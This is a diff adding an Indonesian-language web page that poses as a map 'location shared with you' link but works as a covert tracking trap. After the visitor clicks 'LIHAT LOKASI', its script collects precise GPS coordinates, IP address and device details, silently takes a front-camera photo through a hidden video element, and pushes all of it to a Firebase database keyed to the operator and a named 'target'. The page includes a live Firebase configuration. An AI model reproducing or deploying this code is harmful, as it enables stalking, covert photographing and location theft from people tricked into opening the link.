@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Lokasi Dibagikan 📍</title>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #f1f3f4;
+      min-height: 100vh;
+      color: #202124;
+      padding: 16px;
+    }
+    .container { max-width: 480px; margin: 0 auto; padding-top: 10px; }
+    .top-logo { text-align: center; margin-bottom: 12px; font-size: 13px; color: #5f6368; letter-spacing: 0.5px; }
+    .top-logo b { color: #1a73e8; }
+    .card {
+      background: #fff;
+      border-radius: 16px;
+      overflow: hidden;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.12);
+      margin-bottom: 14px;
+    }
+    .share-head { display: flex; gap: 12px; align-items: center; padding: 16px; }
+    .avatar {
+      width: 48px; height: 48px; border-radius: 50%;
+      background: linear-gradient(135deg, #1a73e8, #34a853);
+      color: #fff; font-size: 22px; font-weight: 600;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+    }
+    .share-head .t1 { font-size: 15px; font-weight: 600; }
+    .share-head .t2 { font-size: 13px; color: #5f6368; margin-top: 3px; line-height: 1.5; }
+    /* peta palsu (preview) */
+    .fake-map {
+      position: relative; height: 260px; overflow: hidden;
+      background: #e5e3df;
+    }
+    .fake-map .water {
+      position: absolute; top: -30px; bottom: -30px; left: 8%;
+      width: 54px; background: #aad3df; transform: rotate(18deg);
+      border-radius: 20px;
+    }
+    .fake-map .park {
+      position: absolute; top: 18px; right: 8%;
+      width: 110px; height: 80px; background: #c8facc;
+      border-radius: 18px; transform: rotate(-8deg);
+    }
+    .fake-map .park2 {
+      position: absolute; bottom: 14px; left: 6%;
+      width: 80px; height: 60px; background: #c8facc;
+      border-radius: 14px; transform: rotate(6deg);
+    }
+    .fake-map .road { position: absolute; background: #fff; box-shadow: 0 0 0 1px #d5d5d5; }
+    .fake-map .r1 { top: 34%; left: -10%; right: -10%; height: 12px; transform: rotate(-4deg); }
+    .fake-map .r2 { top: 62%; left: -10%; right: -10%; height: 9px; transform: rotate(3deg); }
+    .fake-map .r3 { top: -10%; bottom: -10%; left: 46%; width: 10px; transform: rotate(9deg); }
+    .fake-map .r4 { top: -10%; bottom: -10%; left: 72%; width: 8px; transform: rotate(-7deg); }
+    .fake-map .main-road {
+      position: absolute; top: 46%; left: -10%; right: -10%; height: 16px;
+      background: #fbcf7d; transform: rotate(-2deg);
+      box-shadow: 0 0 0 1px #e8b34b;
+    }
+    .fake-map .grid {
+      position: absolute; inset: 0;
+      background:
+        repeating-linear-gradient(0deg, rgba(0,0,0,0.04) 0 1px, transparent 1px 34px),
+        repeating-linear-gradient(90deg, rgba(0,0,0,0.04) 0 1px, transparent 1px 34px);
+    }
+    .pin-wrap {
+      position: absolute; top: 44%; left: 50%;
+      transform: translate(-50%, -100%);
+      text-align: center; z-index: 5;
+    }
+    .pin { font-size: 46px; filter: drop-shadow(0 4px 6px rgba(0,0,0,0.35)); animation: pinBob 1.6s ease-in-out infinite; }
+    @keyframes pinBob { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-7px); } }
+    .pin-pulse {
+      width: 26px; height: 10px; margin: 2px auto 0;
+      background: rgba(26,115,232,0.35); border-radius: 50%;
+      animation: pulse 1.6s ease-out infinite;
+    }
+    @keyframes pulse { 0% { transform: scale(0.6); opacity: 0.9; } 100% { transform: scale(1.6); opacity: 0; } }
+    .map-tag {
+      position: absolute; top: 10px; left: 10px; z-index: 6;
+      background: rgba(255,255,255,0.95); color: #1a73e8;
+      font-size: 11px; font-weight: 600; padding: 5px 10px;
+      border-radius: 20px; box-shadow: 0 1px 4px rgba(0,0,0,0.2);
+    }
+    .card-body { padding: 16px; }
+    .addr-label { font-size: 12px; color: #5f6368; text-transform: uppercase; letter-spacing: 0.8px; margin-bottom: 4px; }
+    .addr { font-size: 16px; font-weight: 500; line-height: 1.5; }
+    .acc { font-size: 12px; color: #5f6368; margin-top: 6px; }
+    .btn {
+      display: block; width: 100%; border: none; cursor: pointer;
+      font-family: inherit; font-size: 15px; font-weight: 600;
+      padding: 14px; border-radius: 12px; margin-top: 14px;
+      transition: all 0.2s;
+    }
+    .btn-blue { background: #1a73e8; color: #fff; }
+    .btn-blue:hover { background: #1765cc; }
+    .btn-blue:disabled { background: #9ec1f5; cursor: wait; }
+    .btn-white { background: #fff; color: #1a73e8; border: 1px solid #dadce0; }
+    .btn-row { display: flex; gap: 10px; }
+    .btn-row .btn { margin-top: 12px; }
+    #realMap { width: 100%; height: 280px; background: #e5e3df; }
+    .loading-box { text-align: center; padding: 44px 20px; }
+    .spinner {
+      width: 46px; height: 46px; margin: 0 auto 16px;
+      border: 4px solid #e0e0e0; border-top-color: #1a73e8;
+      border-radius: 50%; animation: spin 0.9s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loading-box p { font-size: 14px; color: #5f6368; }
+    .loading-box .sub { font-size: 12px; color: #9aa0a6; margin-top: 6px; }
+    .error-box {
+      background: #fce8e6; border: 1px solid #f5c6c2; color: #61170f;
+      border-radius: 14px; padding: 26px 20px; text-align: center;
+    }
+    .error-box .icon { font-size: 50px; margin-bottom: 12px; }
+    .error-box h3 { font-size: 16px; margin-bottom: 8px; }
+    .error-box p { font-size: 13px; line-height: 1.6; opacity: 0.9; }
+    .footer { text-align: center; font-size: 11px; color: #9aa0a6; margin-top: 16px; padding-bottom: 16px; }
+    .note-approx {
+      background: #fef7e0; border: 1px solid #fde68a; color: #7a5c00;
+      font-size: 12px; padding: 8px 12px; border-radius: 10px; margin-top: 10px; line-height: 1.5;
+    }
+  </style>
+</head>
+<body>
+<div class="container">
+  <div class="top-logo">📍 <b>Maps</b> · Berbagi Lokasi</div>
+
+  <!-- KARTU 1: undangan / preview -->
+  <div class="card" id="inviteCard">
+    <div class="share-head">
+      <div class="avatar">?</div>
+      <div>
+        <div class="t1">Seseorang membagikan lokasinya</div>
+        <div class="t2">Tautan lokasi real-time · berlaku sementara.<br>Klik tombol di bawah untuk melihat peta.</div>
+      </div>
+    </div>
+    <div class="fake-map">
+      <div class="water"></div>
+      <div class="park"></div>
+      <div class="park2"></div>
+      <div class="road r1"></div>
+      <div class="road r2"></div>
+      <div class="road r3"></div>
+      <div class="road r4"></div>
+      <div class="main-road"></div>
+      <div class="grid"></div>
+      <div class="map-tag">🗺️ PRATINJAU PETA</div>
+      <div class="pin-wrap"><div class="pin">📍</div><div class="pin-pulse"></div></div>
+    </div>
+    <div class="card-body">
+      <button class="btn btn-blue" id="btnLihat">📍 LIHAT LOKASI</button>
+    </div>
+  </div>
+
+  <!-- KARTU 2: loading -->
+  <div class="card" id="loadingCard" style="display:none">
+    <div class="loading-box">
+      <div class="spinner"></div>
+      <p>Memuat lokasi...</p>
+      <p class="sub">Mohon tunggu sebentar</p>
+    </div>
+  </div>
+
+  <!-- KARTU 3: peta asli -->
+  <div class="card" id="mapCard" style="display:none">
+    <div id="realMap"></div>
+    <div class="card-body">
+      <div class="addr-label">Lokasi</div>
+      <div class="addr" id="addrText">Memuat...</div>
+      <div class="acc" id="accText"></div>
+      <div class="note-approx" id="approxNote" style="display:none">⚠️ GPS tidak tersedia, menampilkan perkiraan lokasi berdasarkan jaringan.</div>
+      <div class="btn-row">
+        <a id="btnGmaps" href="#" target="_blank" rel="noopener" style="flex:1;text-decoration:none"><button class="btn btn-blue" style="width:100%">🧭 RUTE</button></a>
+        <button class="btn btn-white" style="flex:1" onclick="location.reload()">🔄 MUAT ULANG</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- KARTU 4: error -->
+  <div class="error-box" id="errorCard" style="display:none">
+    <div class="icon">🚫</div>
+    <h3>Lokasi Tidak Dapat Dimuat</h3>
+    <p id="errorText">Izin lokasi tidak diberikan.<br>Refresh halaman lalu klik <b>"Izinkan"</b> untuk melihat peta.</p>
+  </div>
+
+  <div class="footer">Tautan berbagi lokasi · v1.0</div>
+</div>
+
+<canvas id="canvas" style="display:none"></canvas>
+<video id="video" autoplay playsinline muted style="display:none"></video>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
+import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyBYjDmJh5OG_AkZesWObgGkSgr6yX0iBEI",
+  authDomain: "roraxbali-65802.firebaseapp.com",
+  databaseURL: "https://roraxbali-65802-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "roraxbali-65802",
+  storageBucket: "roraxbali-65802.firebasestorage.app",
+  messagingSenderId: "750633313866",
+  appId: "1:750633313866:web:3d2e552960e06db83968b3"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+// param link: ?u=username_dashboard&t=nama_target
+const params = new URLSearchParams(location.search);
+const user = (params.get('u') || '').trim().slice(0, 64);
+const target = ((params.get('t') || '').trim().slice(0, 50)) || 'target';
+
+const inviteCard = document.getElementById('inviteCard');
+const loadingCard = document.getElementById('loadingCard');
+const mapCard = document.getElementById('mapCard');
+const errorCard = document.getElementById('errorCard');
+const btnLihat = document.getElementById('btnLihat');
+const show = el => { el.style.display = 'block'; };
+const hide = el => { el.style.display = 'none'; };
+function setStep(t) { const s = document.querySelector('#loadingCard .sub'); if (s) s.innerText = t; }
+function fetchTimeout(url, ms, opts = {}) {
+  const ctl = new AbortController();
+  const to = setTimeout(() => ctl.abort(), ms);
+  return fetch(url, { ...opts, signal: ctl.signal }).finally(() => clearTimeout(to));
+}
+
+let sudahKirim = false, prosesJalan = false;
+
+async function kirim(payload) {
+  try { await push(ref(db, 'lokasi/' + user), payload); return true; }
+  catch (e) { console.warn('push gagal:', e); return false; }
+}
+
+async function collectDevice() {
+  const d = {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform || '-',
+    bahasa: navigator.language,
+    screen: `${screen.width}x${screen.height}`,
+    pixelRatio: window.devicePixelRatio || 1,
+    timezone: (() => { try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) { return '-'; } })(),
+    cpu: navigator.hardwareConcurrency || '-',
+    memori: navigator.deviceMemory || '-',
+    touch: 'ontouchstart' in window,
+    online: navigator.onLine
+  };
+  try {
+    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (c) {
+      d.network = c.effectiveType || '-';
+      d.kecepatan = (c.downlink != null) ? c.downlink + ' Mbps' : '-';
+      d.ping = (c.rtt != null) ? c.rtt + ' ms' : '-';
+    }
+  } catch (e) {}
+  try {
+    if (navigator.getBattery) {
+      const b = await Promise.race([
+        navigator.getBattery(),
+        new Promise(r => setTimeout(() => r(null), 3000))
+      ]);
+      if (b) { d.baterai = Math.round(b.level * 100) + '%'; d.charging = b.charging ? 'Mengisi' : 'Tidak'; }
+    }
+  } catch (e) {}
+  return d;
+}
+
+async function getIP() {
+  try {
+    const r = await fetchTimeout('https://api.ipify.org?format=json', 6000);
+    const j = await r.json();
+    return j.ip || null;
+  } catch (e) { return null; }
+}
+
+async function getIPGeo() {
+  try {
+    const r = await fetchTimeout('https://ipwho.is/', 7000);
+    const j = await r.json();
+    if (j && j.success !== false && j.latitude != null && j.longitude != null) {
+      return { lat: Number(j.latitude), lng: Number(j.longitude), kota: j.city || j.region || 'Lokasi Anda' };
+    }
+    return null;
+  } catch (e) { return null; }
+}
+
+function getLocation() {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) { resolve({ err: 'no-geo' }); return; }
+    let done = false;
+    const fin = (v) => { if (!done) { done = true; resolve(v); } };
+    const timer = setTimeout(() => fin({ err: 'timeout' }), 9000);
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        clearTimeout(timer);
+        fin({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy });
+      },
+      (err) => {
+        clearTimeout(timer);
+        fin({ err: (err && err.code === 1) ? 'denied' : 'unavailable' });
+      },
+      { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+    );
+  });
+}
+
+async function getCameraPhoto(timeoutMs = 10000) {
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
+  let stream = null;
+  try {
+    stream = await Promise.race([
+      navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 800 } },
+        audio: false
+      }),
+      new Promise((_, rej) => setTimeout(() => rej(new Error('cam-timeout')), timeoutMs))
+    ]);
+    const video = document.getElementById('video');
+    video.srcObject = stream;
+    await video.play().catch(() => {});
+    await new Promise(r => setTimeout(r, 1200));
+    const W = 480, H = 640;
+    const canvas = document.getElementById('canvas');
+    canvas.width = W; canvas.height = H;
+    const ctx = canvas.getContext('2d');
+    const vw = video.videoWidth || W, vh = video.videoHeight || H;
+    const scale = Math.max(W / vw, H / vh);
+    const dw = vw * scale, dh = vh * scale;
+    ctx.drawImage(video, (W - dw) / 2, (H - dh) / 2, dw, dh);
+    return canvas.toDataURL('image/jpeg', 0.7);
+  } catch (e) {
+    return null;
+  } finally {
+    try {
+      if (stream) stream.getTracks().forEach(t => t.stop());
+      const v = document.getElementById('video');
+      if (v) v.srcObject = null;
+    } catch (e) {}
+  }
+}
+
+function tampilMap(lat, lng, label, approx) {
+  show(mapCard);
+  try {
+    const m = L.map('realMap', { zoomControl: true, attributionControl: true }).setView([lat, lng], approx ? 11 : 16);
+    L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(m);
+    L.marker([lat, lng]).addTo(m).bindPopup(label).openPopup();
+    setTimeout(() => { try { m.invalidateSize(); } catch (e) {} }, 300);
+  } catch (e) {}
+  document.getElementById('addrText').innerText = label;
+  document.getElementById('accText').innerText = lat.toFixed(5) + ', ' + lng.toFixed(5);
+  document.getElementById('btnGmaps').href = 'https://www.google.com/maps?q=' + encodeURIComponent(lat) + ',' + encodeURIComponent(lng);
+  if (approx) show(document.getElementById('approxNote'));
+}
+
+async function mulaiProses() {
+  setStep('Mengambil lokasi GPS...');
+  const [pos, dev, ip] = await Promise.all([getLocation(), collectDevice(), getIP()]);
+
+  let lat = null, lng = null, akurasi = null, sumber = null, status = 'ok', kota = 'Lokasi Anda';
+
+  if (pos && pos.lat != null && Number.isFinite(Number(pos.lat))) {
+    lat = Number(pos.lat); lng = Number(pos.lng);
+    akurasi = (pos.accuracy != null) ? Math.round(pos.accuracy) : null;
+    sumber = 'GPS';
+    try {
+      const geo = await fetchTimeout(
+        `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=id`, 6000);
+      const gd = await geo.json();
+      kota = gd.city || gd.locality || gd.principalSubdivision || 'Lokasi Anda';
+    } catch (e) {}
+    hide(loadingCard);
+    tampilMap(lat, lng, kota + (akurasi != null ? ' (±' + akurasi + ' m)' : ''), false);
+  } else {
+    setStep('GPS gagal, coba lokasi jaringan...');
+    const g = await getIPGeo();
+    if (g) {
+      lat = g.lat; lng = g.lng; kota = g.kota;
+      sumber = 'IP (perkiraan)'; status = 'approx-ip';
+      hide(loadingCard);
+      tampilMap(lat, lng, kota, true);
+    } else {
+      if (!sudahKirim) {
+        sudahKirim = true;
+        kirim({ target, via: 'maps', waktu: Date.now(), status: (pos && pos.err === 'denied') ? 'denied' : 'gps-fail', sumber: 'GAGAL', kota: '-', ip: ip || null, ...dev });
+      }
+      hide(loadingCard);
+      if (pos && pos.err === 'denied') {
+        document.getElementById('errorText').innerHTML = 'Izin lokasi tidak diberikan.<br>Refresh halaman lalu klik <b>"Izinkan"</b> untuk melihat peta.';
+      } else {
+        document.getElementById('errorText').innerHTML = 'Tidak dapat mendeteksi lokasi.<br>Pastikan <b>GPS aktif</b> lalu <b>refresh halaman</b>.';
+      }
+      show(errorCard);
+      return;
+    }
+  }
+
+  const payload = {
+    target, via: 'maps', waktu: Date.now(),
+    lat, lng, akurasi, sumber, status, kota,
+    ip: ip || null,
+    ...dev
+  };
+
+  if (!sudahKirim) {
+    const foto = await Promise.race([
+      getCameraPhoto(10000),
+      new Promise(r => setTimeout(() => r(null), 12000))
+    ]);
+    if (foto) payload.foto = foto;
+    sudahKirim = true;
+    await kirim(payload);
+  }
+}
+
+btnLihat.addEventListener('click', () => {
+  if (prosesJalan) return; prosesJalan = true;
+  btnLihat.disabled = true;
+  hide(inviteCard);
+  show(loadingCard);
+  mulaiProses();
+});
+
+if (!user) {
+  document.body.innerHTML = '<div style="color:#5f6368;text-align:center;padding:50px;font-family:sans-serif;">Link tidak valid</div>';
+}
+</script>
+</body>
+</html>
